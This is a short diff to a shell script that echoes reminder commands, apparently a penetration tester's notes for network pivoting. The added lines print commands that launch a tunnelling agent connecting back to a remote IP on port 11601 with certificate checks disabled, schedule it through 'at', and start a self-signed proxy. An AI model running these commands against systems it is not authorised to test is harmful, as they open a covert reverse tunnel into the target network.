@@ -42,3 +42,11 @@ echo ""
 echo "con 'at' "
 
 echo "'/home/ass/agent -connect IP:11601 -ignore-cert' | at now + 1 minute"
+
+echo "_________________________________________________________"
+
+echo ""
+
+echo "./agent -connect $IP:11601 -ignore-cert"
+
+echo "./proxy -selfcert"
